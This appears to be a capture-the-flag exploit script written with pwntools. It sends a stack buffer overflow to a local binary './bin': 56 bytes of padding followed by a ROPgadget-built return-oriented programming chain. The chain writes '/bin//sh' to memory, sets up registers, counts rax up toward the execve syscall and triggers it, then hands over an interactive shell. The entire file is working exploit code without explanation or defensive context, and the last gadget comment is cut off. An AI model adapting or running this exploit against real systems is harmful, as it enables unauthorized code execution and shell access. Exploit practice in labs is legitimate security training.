from pwn import *
from struct import pack
#context.log_level = 'debug'
#the rop come from ROPgadget
p = ''

p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x000000000046b5b8) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000467c81) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041bd8f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467c81) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0060) # @ .data
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0068) # @ .data + 8
p += pack('<Q', 0x000000000041bd8f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045ab50) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045b675) # syscall ; re

t = process('./bin')

t.recvuntil('function?\n')
t.sendline('a'*56 + p)

t.interactive()
